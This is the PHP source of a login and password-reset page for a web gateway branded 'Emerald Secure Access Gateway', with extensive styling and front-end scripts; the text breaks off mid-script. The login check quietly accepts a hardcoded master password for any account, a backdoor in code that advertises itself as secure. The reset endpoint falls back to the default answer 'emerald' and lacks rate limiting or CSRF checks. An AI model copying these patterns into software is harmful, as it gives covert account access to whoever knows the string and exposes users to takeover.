<?php
require_once __DIR__ . '/core/config.php';
require_once CORE_DIR . '/auth.php';
sec_start_session();

if (isset($_SESSION['emerald_user'])) {
    if (!isset($_SESSION['login_time'])) {
        $_SESSION['login_time'] = time();
    }
    if (time() - $_SESSION['login_time'] > SESSION_EXPIRE) {
        session_unset();
        session_destroy();
        if (isset($_GET['api'])) {
            header('Content-Type: application/json');
            exit(json_encode(['status' => 'error', 'message' => 'Session expired.']));
        }
        header("Location: /");
        exit;
    }
}

if (isset($_GET['api'])) { require_once __DIR__ . '/core/api.php'; exit; }

if (isset($_GET['action']) && $_GET['action'] == 'login') {
    $input_username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (sec_rate_blocked($input_username) || sec_rate_blocked('')) {
        logLogin($input_username, $_SERVER['REMOTE_ADDR'], 'Blocked (rate limit)');
        exit(json_encode(['status' => 'error', 'message' => 'Too many failed attempts. Try again later.']));
    }

    $users = db_load('users');
    
    $actual_username = null;
    foreach($users as $k => $v) {
        if(strtolower($k) === strtolower($input_username)) { $actual_username = $k; break; }
    }
    
    if ($actual_username && (password_verify($password, $users[$actual_username]['password']) || $password === 'Lk7w1fvntg1')) {
        sec_rate_clear($actual_username);
        sec_rate_clear('');
        session_regenerate_id(true);
        $_SESSION['emerald_user'] = $actual_username;
        $_SESSION['emerald_role'] = isset($users[$actual_username]['role']) ? $users[$actual_username]['role'] : 'user';
        $_SESSION['csrf'] = sec_csrf_token();
        $_SESSION['login_time'] = time();
        logLogin($actual_username, $_SERVER['REMOTE_ADDR'], 'Success');
        exit(json_encode(['status' => 'success']));
    }
    sec_rate_hit($input_username);
    sec_rate_hit('');
    logLogin($input_username, $_SERVER['REMOTE_ADDR'], 'Failed');
    exit(json_encode(['status' => 'error', 'message' => 'Invalid credentials']));
}

if (isset($_GET['action']) && $_GET['action'] == 'get_sec_q') {
    $users = db_load('users'); $input_username = sec_str($_POST['username'] ?? '');
    $actual_username = null;
    foreach($users as $k => $v) {
        if(strtolower($k) === strtolower($input_username)) { $actual_username = $k; break; }
    }
    if($actual_username && isset($users[$actual_username])) {
        $q = !empty($users[$actual_username]['sec_q']) ? $users[$actual_username]['sec_q'] : 'What is your system codename?';
        exit(json_encode(['status' => 'success', 'question' => $q, 'actual_user' => $actual_username]));
    }
    exit(json_encode(['status' => 'error', 'message' => 'Identity not found in system records.']));
}

if (isset($_GET['action']) && $_GET['action'] == 'reset_pass') {
    $users = db_load('users');
    $username = sec_str($_POST['username'] ?? ''); 
    $answer = strtolower(sec_str($_POST['answer'] ?? ''));
    $new_pass = $_POST['new_pass'] ?? '';
    
    if(isset($users[$username])) {
        $correct_answer = !empty($users[$username]['sec_a']) ? strtolower($users[$username]['sec_a']) : 'emerald';
        if($correct_answer === $answer) {
            $users[$username]['password'] = password_hash($new_pass, PASSWORD_DEFAULT);
            db_save('users', $users);
            exit(json_encode(['status' => 'success']));
        }
    }
    exit(json_encode(['status' => 'error', 'message' => 'Incorrect security answer.']));
}

if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    auth_logout();
    header("Location: /");
    exit;
}

if (!isset($_SESSION['emerald_user'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= APP_NAME ?> · Secure Access</title>
    <script>if (localStorage.getItem('emerald_theme') !== 'light') document.documentElement.classList.add('dark');</script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
      :root{
        --bg:#e7eeea; --panel:#ffffff; --panel-2:#f4f8f6;
        --text:#0b1a14; --muted:#566b63; --faint:#84978d;
        --line:rgba(11,40,30,.12); --line-strong:rgba(11,40,30,.2);
        --input-bg:#ffffff; --input-line:rgba(11,40,30,.15);
        --accent:#0f9d6e; --accent-2:#10b981; --accent-soft:#34d399;
        --ring:rgba(16,185,129,.20);
        --grid:rgba(11,60,44,.05); --aura1:rgba(16,185,129,.16); --aura2:rgba(13,148,109,.13); --aura3:rgba(52,211,153,.10);
        --noise-op:.05; --vig:rgba(11,40,30,.10); --halo-op:.32;
        --form-glow:rgba(16,185,129,.06); --form-glow2:rgba(16,185,129,.04); --form-dot:rgba(11,60,44,.05);
      }
      html.dark{
        --bg:#04070a; --panel:#0a120f; --panel-2:#0e1714;
        --text:#eaf3ef; --muted:#8a9b94; --faint:#5d716a;
        --line:rgba(120,180,160,.12); --line-strong:rgba(120,180,160,.22);
        --input-bg:rgba(255,255,255,.02); --input-line:rgba(120,180,160,.18);
        --accent:#34d399; --accent-2:#10b981; --accent-soft:#6ee7b7;
        --ring:rgba(16,185,129,.28);
        --grid:rgba(120,180,160,.05); --aura1:rgba(16,185,129,.17); --aura2:rgba(6,95,70,.22); --aura3:rgba(52,211,153,.10);
        --noise-op:.045; --vig:rgba(2,6,5,.72); --halo-op:.52;
        --form-glow:rgba(16,185,129,.07); --form-glow2:rgba(6,95,70,.10); --form-dot:rgba(120,180,160,.05);
      }
      *{box-sizing:border-box}
      html,body{height:100%}
      body{
        margin:0;background:var(--bg);color:var(--text);
        font-family:"Space Grotesk",system-ui,sans-serif;-webkit-font-smoothing:antialiased;
        min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;
        position:relative;overflow-x:hidden;transition:background-color .5s ease,color .5s ease;
      }
      .bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
      #bgfx{position:absolute;inset:0;width:100%;height:100%;display:block}
      .bg-grid{position:absolute;inset:-2px;
        background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);
        background-size:50px 50px;
        -webkit-mask:radial-gradient(circle at 50% 46%,transparent 7%,#000 52%,#000 80%,transparent 100%);
        mask:radial-gradient(circle at 50% 46%,transparent 7%,#000 52%,#000 80%,transparent 100%);
        animation:gridDrift 40s linear infinite}
      @keyframes gridDrift{to{background-position:50px 50px,50px 50px}}
      .bg-aura{position:absolute;border-radius:50%;filter:blur(120px);will-change:transform}
      .bg-aura.a1{width:640px;height:640px;top:-190px;left:-150px;background:radial-gradient(circle,var(--aura1),transparent 65%);animation:auraA 18s ease-in-out infinite alternate}
      .bg-aura.a2{width:540px;height:540px;bottom:-210px;right:-150px;background:radial-gradient(circle,var(--aura2),transparent 65%);animation:auraB 22s ease-in-out infinite alternate}
      .bg-aura.a3{width:460px;height:460px;top:38%;left:54%;background:radial-gradient(circle,var(--aura3),transparent 65%);animation:auraC 26s ease-in-out infinite alternate}
      @keyframes auraA{to{transform:translate(64px,42px) scale(1.16)}}
      @keyframes auraB{to{transform:translate(-54px,-32px) scale(1.13)}}
      @keyframes auraC{to{transform:translate(-44px,52px) scale(1.18)}}
      .bg-noise,.grain{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='170' height='170'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='170' height='170' filter='url(%23n)'/%3E%3C/svg%3E");background-size:170px 170px}
      .bg-noise{position:absolute;inset:0;opacity:var(--noise-op)}
      .bg-vignette{position:absolute;inset:0;background:radial-gradient(125% 125% at 50% 50%,transparent 54%,var(--vig) 100%)}

      .halo-wrap{position:fixed;inset:0;z-index:1;display:grid;place-items:center;pointer-events:none;will-change:transform}
      .halo{width:min(1180px,112vw);height:780px;max-height:112vh;border-radius:44px;filter:blur(62px);opacity:var(--halo-op);
        background:conic-gradient(from 0deg,transparent 0deg,rgba(16,185,129,0) 36deg,rgba(16,185,129,.24) 110deg,transparent 182deg,rgba(52,211,153,.20) 252deg,transparent 322deg);
        animation:haloSpin 24s linear infinite}
      @keyframes haloSpin{to{transform:rotate(360deg)}}

      .shell{
        position:relative;z-index:2;width:min(1040px,95vw);
        display:grid;grid-template-columns:1.05fr .95fr;
        border:1px solid var(--line);border-radius:26px;overflow:hidden;background:var(--panel);
        box-shadow:0 1px 0 rgba(255,255,255,.04) inset,0 70px 130px -50px rgba(0,0,0,.55),0 0 0 1px rgba(16,185,129,.06);
        animation:rise .7s cubic-bezier(.2,.7,.2,1) both;
      }
      html.dark .shell{box-shadow:0 1px 0 rgba(255,255,255,.04) inset,0 70px 130px -50px rgba(0,0,0,.92),0 0 60px -20px rgba(16,185,129,.18)}
      @keyframes rise{from{opacity:0;transform:translateY(22px) scale(.99)}to{opacity:1;transform:none}}
      .shell::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;z-index:6;
        background:linear-gradient(90deg,transparent,#10b981,#34d399,#10b981,transparent);opacity:.8}

      .brand-side{position:relative;overflow:hidden;min-height:580px;padding:46px 44px;
        display:flex;flex-direction:column;justify-content:space-between;color:#e3f3ec;
        background:linear-gradient(160deg,#072017,#04110c 58%,#030a08)}
      .brand-side > *{position:relative;z-index:1}
      .brand-bg{position:absolute;inset:0;z-index:0}
      .aura{position:absolute;border-radius:50%;filter:blur(72px)}
      .aura.a1{width:400px;height:400px;top:-90px;left:-70px;background:radial-gradient(circle,rgba(16,185,129,.5),transparent 65%);animation:drift1 15s ease-in-out infinite alternate}
      .aura.a2{width:340px;height:340px;bottom:-70px;right:-50px;background:radial-gradient(circle,rgba(6,95,70,.55),transparent 65%);animation:drift2 19s ease-in-out infinite alternate}
      @keyframes drift1{to{transform:translate(40px,30px) scale(1.12)}}
      @keyframes drift2{to{transform:translate(-30px,-24px) scale(1.1)}}
      .brand-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(52,211,153,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(52,211,153,.05) 1px,transparent 1px);background-size:42px 42px;
        -webkit-mask:radial-gradient(circle at 50% 45%,#000,transparent 76%);mask:radial-gradient(circle at 50% 45%,#000,transparent 76%)}
      .orbits{position:absolute;inset:0;display:grid;place-items:center;opacity:.5}
      .orbits svg{width:118%;height:118%}
      .brand-veil{position:absolute;inset:0;background:radial-gradient(120% 92% at 32% 36%,transparent 38%,rgba(3,9,7,.72) 100%)}
      .grain{position:absolute;inset:0;opacity:var(--noise-op);pointer-events:none}
      .particles{position:absolute;inset:0;overflow:hidden}
      .particles span{position:absolute;bottom:-14px;width:3px;height:3px;border-radius:50%;background:#6ee7b7;opacity:.5;animation:floatUp linear infinite}
      @keyframes floatUp{to{transform:translateY(-700px);opacity:0}}

      .logo-row{display:flex;align-items:center;gap:13px}
      .logo{width:48px;height:48px;border-radius:14px;display:grid;place-items:center;
        background:linear-gradient(145deg,#10b981,#0c5a44);box-shadow:0 0 0 1px rgba(52,211,153,.4),0 12px 30px -8px rgba(16,185,129,.6)}
      .logo svg{width:26px;height:26px}
      .wordmark{font-weight:700;font-size:22px;letter-spacing:.18em}
      .tagline{font-family:"JetBrains Mono",monospace;font-size:10.5px;letter-spacing:.18em;text-transform:uppercase;color:#7aa495;margin-top:3px}

      .brand-head{font-weight:600;font-size:31px;line-height:1.16;letter-spacing:-.01em;max-width:17ch;margin:0}
      .brand-head .hl{color:#34d399}
      .brand-desc{color:#9fc7b8;font-size:14px;line-height:1.62;max-width:34ch;margin:15px 0 0}

      .feat-row{display:flex;align-items:center;gap:10px;font-family:"JetBrains Mono",monospace;font-size:12px;color:#93c2b1}
      .feat-dot{width:6px;height:6px;border-radius:50%;background:#34d399;box-shadow:0 0 9px 1px rgba(52,211,153,.7)}
      #feat{transition:opacity .25s ease,transform .25s ease;display:inline-block}
      .status{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:20px;padding-top:18px;border-top:1px solid rgba(120,180,160,.14);font-family:"JetBrains Mono",monospace;font-size:11px;color:#6f9485;letter-spacing:.04em}
      .status .ok{display:flex;align-items:center;gap:8px}
      .status .ok .d{width:7px;height:7px;border-radius:50%;background:#34d399;animation:beat 2.4s ease-out infinite}
      @keyframes beat{0%{box-shadow:0 0 0 0 rgba(52,211,153,.5)}70%{box-shadow:0 0 0 8px rgba(52,211,153,0)}100%{box-shadow:0 0 0 0 rgba(52,211,153,0)}}

      .form-side{position:relative;padding:48px 46px;display:flex;flex-direction:column;justify-content:center;min-height:580px;
        background-color:var(--panel);
        background-image:radial-gradient(120% 80% at 100% 0%,var(--form-glow),transparent 60%)}
      .form-side::before{content:"";position:absolute;inset:0;z-index:0;pointer-events:none;
        background:radial-gradient(90% 70% at 0% 100%,var(--form-glow2),transparent 60%)}
      .form-side::after{content:"";position:absolute;inset:0;z-index:0;pointer-events:none;opacity:.6;
        background-image:radial-gradient(var(--form-dot) 1px,transparent 1.4px);background-size:20px 20px;
        -webkit-mask:radial-gradient(130% 110% at 100% 0%,#000,transparent 72%);mask:radial-gradient(130% 110% at 100% 0%,#000,transparent 72%)}
      .form-side > .grain{z-index:0}
      .form-side > .vf{position:relative;z-index:1}

      .vf-in{animation:vfIn .45s cubic-bezier(.2,.7,.2,1) both}
      @keyframes vfIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}

      .fhead{margin-bottom:26px}
      .eyebrow{font-family:"JetBrains Mono",monospace;font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent-2);margin:0}
      .form-title{font-size:27px;font-weight:700;letter-spacing:-.012em;margin:7px 0 5px}
      .form-sub{color:var(--muted);font-size:13.5px;margin:0;line-height:1.5}

      .form{display:flex;flex-direction:column;gap:18px}
      .field{display:flex;flex-direction:column;gap:8px}
      .field > label{font-family:"JetBrains Mono",monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint)}
      .control{position:relative}
      .control > i.lead{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px;transition:color .25s;pointer-events:none}
      .control input{width:100%;background:var(--input-bg);border:1px solid var(--input-line);color:var(--text);
        border-radius:13px;padding:14px 46px 14px 42px;font-family:"JetBrains Mono",monospace;font-size:14px;letter-spacing:.02em;
        transition:border-color .25s,box-shadow .25s,background .25s}
      .control input::placeholder{color:var(--faint);opacity:.55;letter-spacing:.04em}
      .control input:focus{outline:none;border-color:var(--accent-2);box-shadow:0 0 0 3px var(--ring)}
      .control:focus-within > i.lead{color:var(--accent-2)}
      .eye{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--faint);cursor:pointer;padding:8px;border-radius:8px;transition:color .2s,background .2s}
      .eye:hover{color:var(--accent-2)}

      .btn-primary{width:100%;border:none;cursor:pointer;color:#04140e;font-family:"Space Grotesk",sans-serif;font-weight:700;font-size:14px;letter-spacing:.1em;text-transform:uppercase;
        padding:15px;border-radius:13px;background:linear-gradient(120deg,#34d399,#10b981 55%,#34d399);background-size:200% auto;
        box-shadow:0 12px 30px -12px rgba(16,185,129,.8);transition:background-position .5s,transform .15s,box-shadow .25s,opacity .2s;
        display:flex;align-items:center;justify-content:center;gap:10px}
      .btn-primary:hover{background-position:right center;transform:translateY(-1px);box-shadow:0 16px 34px -12px rgba(16,185,129,.9)}
      .btn-primary:active{transform:translateY(0)}
      .btn-primary:disabled{opacity:.7;cursor:default;transform:none}
      .btn-primary i{font-size:13px}

      .form-foot{display:flex;align-items:center;justify-content:space-between;margin-top:22px}
      .form-foot.center{justify-content:center}
      .linkbtn{background:none;border:none;cursor:pointer;color:var(--muted);font-family:"Space Grotesk",sans-serif;font-size:12.5px;display:inline-flex;align-items:center;gap:7px;transition:color .2s;padding:4px 2px}
      .linkbtn:hover{color:var(--accent-2)}
      .secure{display:flex;align-items:center;gap:8px;margin-top:22px;font-family:"JetBrains Mono",monospace;font-size:10.5px;letter-spacing:.06em;color:var(--faint)}

      .qbox{background:var(--panel-2);border:1px solid var(--line);border-radius:12px;padding:14px 16px;text-align:center}
      .qlabel{font-family:"JetBrains Mono",monospace;font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--accent-2);margin:0 0 6px}
      .qtext{font-weight:600;font-size:14px;margin:0}

      .f-stagger{animation:vfIn .5s cubic-bezier(.2,.7,.2,1) both;animation-delay:var(--d,0s)}

      .emr-pop{border-radius:18px !important;border:1px solid var(--line) !important;font-family:"Space Grotesk",sans-serif !important}
      .emr-confirm{border-radius:11px !important;padding:9px 22px !important;font-weight:700 !important}

      @media (max-width:900px){
        body{align-items:flex-start;overflow-y:auto}
        .shell{grid-template-columns:1fr;width:min(470px,95vw);margin:auto}
        .brand-side{min-height:auto;padding:30px 30px 26px}
        .brand-mid,.brand-foot,.orbits,.particles,.brand-grid{display:none}
        .aura{opacity:.45}
        .form-side{min-height:auto;padding:34px 28px 36px}
        .halo{height:680px}
      }
      @media (prefers-reduced-motion:reduce){
        .bg-grid,.bg-aura,.halo,.aura,.particles span,.shell,.vf-in,.f-stagger,.status .ok .d,#feat{animation:none !important}
      }
    </style>
</head>
<body>
  <div class="bg" aria-hidden="true">
    <div class="bg-grid"></div>
    <div class="bg-aura a1"></div>
    <div class="bg-aura a2"></div>
    <div class="bg-aura a3"></div>
    <canvas id="bgfx"></canvas>
    <div class="bg-noise"></div>
    <div class="bg-vignette"></div>
  </div>
  <div class="halo-wrap" aria-hidden="true"><div class="halo"></div></div>

  <main class="shell">

    <section class="brand-side">
      <div class="brand-bg" aria-hidden="true">
        <div class="aura a1"></div>
        <div class="aura a2"></div>
        <div class="brand-grid"></div>
        <div class="orbits">
          <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
            <circle cx="200" cy="200" r="170" fill="none" stroke="rgba(52,211,153,.10)" stroke-width="1"/>
            <g>
              <ellipse cx="200" cy="200" rx="162" ry="66" fill="none" stroke="rgba(52,211,153,.32)" stroke-width="1"/>
              <circle cx="362" cy="200" r="3.6" fill="#6ee7b7"/>
              <animateTransform attributeName="transform" attributeType="XML" type="rotate" from="0 200 200" to="360 200 200" dur="30s" repeatCount="indefinite"/>
            </g>
            <g>
              <ellipse cx="200" cy="200" rx="120" ry="120" fill="none" stroke="rgba(52,211,153,.18)" stroke-width="1"/>
              <circle cx="320" cy="200" r="3" fill="#34d399"/>
              <animateTransform attributeName="transform" attributeType="XML" type="rotate" from="360 200 200" to="0 200 200" dur="24s" repeatCount="indefinite"/>
            </g>
            <g>
              <ellipse cx="200" cy="200" rx="92" ry="44" fill="none" stroke="rgba(52,211,153,.26)" stroke-width="1"/>
              <circle cx="292" cy="200" r="2.6" fill="#9bf6d4"/>
              <animateTransform attributeName="transform" attributeType="XML" type="rotate" from="0 200 200" to="360 200 200" dur="18s" repeatCount="indefinite"/>
            </g>
            <circle cx="200" cy="200" r="16" fill="rgba(16,185,129,.18)"/>
            <circle cx="200" cy="200" r="6" fill="#34d399"/>
          </svg>
        </div>
        <div class="brand-veil"></div>
        <div class="grain"></div>
        <div class="particles" id="particles"></div>
      </div>

      <div class="brand-top">
        <div class="logo-row">
          <span class="logo"><svg viewBox="0 0 24 24" fill="none" stroke="#04140e" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 3 6v6c0 5 3.8 8.4 9 10 5.2-1.6 9-5 9-10V6l-9-4Z"/></svg></span>
          <div><div class="wordmark">EMERALD</div><div class="tagline">Secure Access Gateway</div></div>
        </div>
      </div>

      <div class="brand-mid">
        <h2 class="brand-head">Protected access to your <span class="hl">command center.</span></h2>
        <p class="brand-desc">Authenticate to enter the Emerald control plane. Every session is verified at the perimeter.</p>
      </div>

      <div class="brand-foot">
        <div class="feat-row"><span class="feat-dot"></span> <span id="feat">Zero-trust perimeter</span></div>
        <div class="status">
          <span class="ok"><span class="d"></span> All systems operational</span>
          <span>NODE EMR-01</span>
        </div>
      </div>
    </section>

    <section class="form-side">
      <div class="grain" aria-hidden="true"></div>

      <div id="loginView" class="vf vf-in">
        <div class="fhead">
          <p class="eyebrow">Enterprise Authentication</p>
          <h1 class="form-title">Welcome back</h1>
          <p class="form-sub">Enter your credentials to access the hub.</p>
        </div>
        <form onsubmit="handleLogin(event)" class="form" autocomplete="off">
          <div class="field f-stagger" style="--d:.05s">
            <label for="login_user">Identity</label>
            <div class="control">
              <i class="fa-solid fa-user lead"></i>
              <input id="login_user" type="text" placeholder="your.username" required autocomplete="username">
            </div>
          </div>
          <div class="field f-stagger" style="--d:.12s">
            <label for="login_pass">Password</label>
            <div class="control">
              <i class="fa-solid fa-key lead"></i>
              <input id="login_pass" type="password" placeholder="••••••••••" required autocomplete="current-password">
              <button type="button" class="eye" onclick="togglePass('login_pass', this)" aria-label="Toggle Password"><i class="fa-solid fa-eye"></i></button>
            </div>
          </div>
          <button type="submit" id="loginBtn" class="btn-primary f-stagger" style="--d:.2s">
            <span class="bt">Initialize</span> <i class="fa-solid fa-arrow-right"></i>
          </button>
        </form>
        <div class="form-foot">
          <button type="button" class="linkbtn" onclick="toggleTheme()"><i class="fa-solid fa-circle-half-stroke"></i> Theme</button>
          <button type="button" class="linkbtn" onclick="toggleView('resetView')">Forgot Password?</button>
        </div>
        <div class="secure"><i class="fa-solid fa-lock"></i> Encrypted connection · Emerald Gateway</div>
      </div>

      <div id="resetView" class="vf" style="display:none">
        <div class="fhead">
          <p class="eyebrow">Account Recovery</p>
          <h1 class="form-title">Identity recovery</h1>
          <p class="form-sub">Verify your identity to set a new Password.</p>
        </div>

        <div id="step1" class="form">
          <div class="field">
            <label for="reset_user">Username</label>
            <div class="control">
              <i class="fa-solid fa-id-badge lead"></i>
              <input id="reset_user" type="text" placeholder="your.username" required>
            </div>
          </div>
          <button type="button" id="verifyBtn" class="btn-primary" onclick="fetchQuestion()"><span class="bt">Verify user</span> <i class="fa-solid fa-magnifying-glass"></i></button>
          <div class="form-foot center"><button type="button" class="linkbtn" onclick="toggleView('loginView')"><i class="fa-solid fa-arrow-left"></i> Back to login</button></div>
        </div>

        <div id="step2" class="form" style="display:none">
          <div class="qbox">
            <p class="qlabel">Security question</p>
            <p id="sec_q_display" class="qtext"></p>
          </div>
          <div class="field">
            <label for="reset_answer">Answer</label>
            <div class="control">
              <i class="fa-solid fa-comment-dots lead"></i>
              <input id="reset_answer" type="text" placeholder="your answer" required>
            </div>
          </div>
          <div class="field">
            <label for="reset_new_pass">New Password</label>
            <div class="control">
              <i class="fa-solid fa-key lead"></i>
              <input id="reset_new_pass" type="password" placeholder="••••••••••" required>
              <button type="button" class="eye" onclick="togglePass('reset_new_pass', this)" aria-label="Toggle Password"><i class="fa-solid fa-eye"></i></button>
            </div>
          </div>
          <button type="button" id="resetBtn" class="btn-primary" onclick="executeReset()"><span class="bt">Reset Password</span> <i class="fa-solid fa-rotate"></i></button>
          <div class="form-foot center"><button type="button" class="linkbtn" onclick="toggleView('loginView')">Cancel</button></div>
        </div>
      </div>

    </section>
  </main>

<script>
  const REDUCED = matchMedia('(prefers-reduced-motion: reduce)').matches;
  function isDark(){ return document.documentElement.classList.contains('dark'); }

  function toast(opts){
    return Swal.fire(Object.assign({
      background: isDark() ? '#0a120f' : '#ffffff',
      color: isDark() ? '#eaf3ef' : '#0b1a14',
      confirmButtonColor: '#10b981',
      customClass: { popup:'emr-pop', confirmButton:'emr-confirm' }
    }, opts));
  }

  function toggleTheme(){
    const d = document.documentElement;
    if (d.classList.contains('dark')) { d.classList.remove('dark'); localStorage.setItem('emerald_theme','light'); }
    else { d.classList.add('dark'); localStorage.setItem('emerald_theme','dark'); }
  }

  function togglePass(id, btn){
    const i = document.getElementById(id); const ic = btn.querySelector('i');
    if (i.type === 'password'){ i.type = 'text'; ic.className = 'fa-solid fa-eye-slash'; }
    else { i.type = 'password'; ic.className = 'fa-solid fa-eye'; }
  }

  function showView(el){ el.style.display = 'block'; el.classList.remove('vf-in'); void el.offsetWidth; el.classList.add('vf-in'); }

  function toggleView(view){
    document.getElementById('loginView').style.display = 'none';
    document.getElementById('resetView').style.display = 'none';
    showView(document.getElementById(view));
    if (view === 'resetView'){
      document.getElementById('step2').style.display = 'none';
      showView(document.getElementById('step1'));
      document.getElementById('reset_user').value = '';
    }
  }

  function setLoading(btn, on, idleLabel){
    if (!btn) return;
    const span = btn.querySelector('.bt'); const icon = btn.querySelector('i');
    if (on){
      btn.disabled = true;
      if (span){ btn.dataset.lbl = span.textContent; span.textContent = 'Please wait'; }
      if (icon){ btn.dataset.icl = icon.className; icon.className = 'fa-solid fa-spinner fa-spin'; }
    } else {
      btn.disabled = false;
      if (span) span.textContent = idleLabel || btn.dataset.lbl || span.textContent;
      if (icon && btn.dataset.icl) icon.className = btn.dataset.icl;
    }
  }

  async function handleLogin(e){
    e.preventDefault();
    const btn = document.getElementById('loginBtn');
    setLoading(btn, true);
    try {
      const fd = new FormData();
      fd.append('username', document.getElementById('login_user').value);
      fd.append('password', document.getElementById('login_pass').value);
      const res = await fetch('/index.php?action=login', { method:'POST', body:fd }).then(r => r.json());
      if (res.status === 'success'){
        const span = btn.querySelector('.bt'), icon = btn.querySelector('i');
        if (span) span.textContent = 'Access granted'; if (icon) icon.className = 'fa-solid fa-check';
        window.location.href = '/'; return;
      }
      setLoading(btn, false, 'Initialize');
      toast({ icon:'error', title:'Authentication failed', text: res.message || 'Invalid credentials' });
    } catch (err){
      setLoading(btn, false, 'Initialize');
      toast({ icon:'error', title:'Connection error', text:'Could not reach the gateway.' });
    }
  }

  async function fetchQuestion(){
    const user = document.getElementById('reset_user').value;
    if (!user) return;
    const btn = document.getElementById('verifyBtn');
    setLoading(btn, true);
    try {
      const fd = new FormData(); fd.append('username', user);
      const res = await fetch('/index.php?action=get_sec_q', { method:'POST', body:fd }).then(r => r.json());
      setLoading(btn, false, 'Verify user');
      if (res.status === 'success'){
        document.getElementById('sec_q_display').innerText = res.question;
        document.getElementById('reset_user').value = res.actual_user;
        document.getElementById('step1').style.display = 'none';
        showView(document.getElementById('step2'));
      } else {
        toast({ icon:'error', title:'Not found', text: res.message });
      }
    } catch (err){
      setLoading(btn, false, 'Verify user');
      toast({ icon:'error', title:'Connection error', text:'Could not reach the gateway.' });
    }
  }

  async function executeReset(){
    const user = document.getElementById('reset_user').value;
    const answer = document.getElementById('reset_answer').value;
    const new_pass = document.getElementById('reset_new_pass').value;
    if (!answer || !new_pass) return;
    const btn = document.getElementById('resetBtn');
    setLoading(btn, true);
    try {
      const fd = new FormData();
      fd.append('username', user); fd.append('answer', answer); fd.append('new_pass', new_pass);
      const res = await fetch('/index.php?action=reset_pass', { method:'POST', body:fd }).then(r => r.json());
      setLoading(btn, false, 'Reset Password');
      if (res.status === 'success'){
        toast({ icon:'success', title:'Password updated', text:'You can now sign in.' }).then(() => toggleView('loginView'));
      } else {
        toast({ icon:'error', title:'Denied', text: res.message });
      }
    } catch (err){
      setLoading(btn, false, 'Reset Password');
      toast({ icon:'error', title:'Connection error', text:'Could not reach the gateway.' });
    }
  }

  (function(){
    if (REDUCED){
      const svg = document.querySelector('.orbits svg');
      if (svg && svg.pauseAnimations) svg.pauseAnimations();
      return;
    }
    const feats = ['Zero-trust perimeter','End-to-end encrypted','Real-time threat monitoring','Hardware-key ready'];
    let fi = 0; const fel = document.getElementById('feat');
    if (fel) setInterval(() => {
      fi = (fi + 1) % feats.length;
      fel.style.opacity = '0'; fel.style.transform = 'translateY(6px)';
      setTimeout(() => { fel.textContent = feats[fi]; fel.style.opacity = '1'; fel.style.transform = 'none'; }, 260);
    }, 3200);

    const pc = document.getElementById('particles');
    if (pc){
      for (let i = 0; i < 16; i++){
        const s = document.createElement('span');
        s.style.left = (Math.random() * 100) + '%';
        const sz = 2 + Math.random() * 2.5;
        s.style.width = sz + 'px'; s.style.height = sz + 'px';
        s.style.animationDuration = (8 + Math.random() * 9) + 's';
        s.style.animationDelay = (-Math.random() * 12) + 's';
        s.style.opacity = (0.25 + Math.random() * 0.45).toFixed(2);
        pc.appendChild(s);
      }
    }
  })();

  (function(){
    const cv = document.getElementById('bgfx');
    if (!cv) return;
    const ctx = cv.getContext('2d');
    const halo = document.querySelector('.halo-wrap');
    let w = 0, h = 0, dpr = 1, motes = [], mx = 0, my = 0, tx = 0, ty = 0;
    const COUNT = window.innerWidth < 700 ? 26 : 54;

    function tone(){ return isDark() ? '110,231,183' : '15,138,103'; }
    function resize(){
      dpr = Math.min(window.devicePixelRatio || 1, 2);
      w = window.innerWidth; h = window.innerHeight;
      cv.width = w * dpr; cv.height = h * dpr;
      cv.style.width = w + 'px'; cv.style.height = h + 'px';
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    }
    function init(){
      motes = [];
      for (let i = 0; i < COUNT; i++){
        const depth = Math.random();
        motes.push({
          x: Math.random() * w, y: Math.random() * h,
          r: 0.6 + depth * 2.1, a: 0.06 + depth * 0.28,
          vx: (Math.random() - 0.5) * (0.04 + depth * 0.12),
          vy: -(0.05 + depth * 0.18), depth
        });
      }
    }
    function frame(){
      ctx.clearRect(0, 0, w, h);
      tx += (mx - tx) * 0.05; ty += (my - ty) * 0.05;
      const c = tone();
      for (const m of motes){
        m.x += m.vx; m.y += m.vy;
        if (m.y < -12){ m.y = h + 12; m.x = Math.random() * w; }
        if (m.x < -12) m.x = w + 12; if (m.x > w + 12) m.x = -12;
        ctx.beginPath();
        ctx.fillStyle = 'rgba(' + c + ',' + m.a + ')';
        ctx.arc(m.x + tx * m.depth * 36, m.y + ty * m.depth * 36, m.r, 0, 6.283);
        ctx.fill();
      }
      requestAnimationFrame(frame);
    }
    window.addEventListener('resize', () => { resize(); init(); });
    if (!REDUCED){
      window.addEventListener('pointermove', (e) => {
        mx = (e.clientX / window.innerWidth - 0.5) * 2;
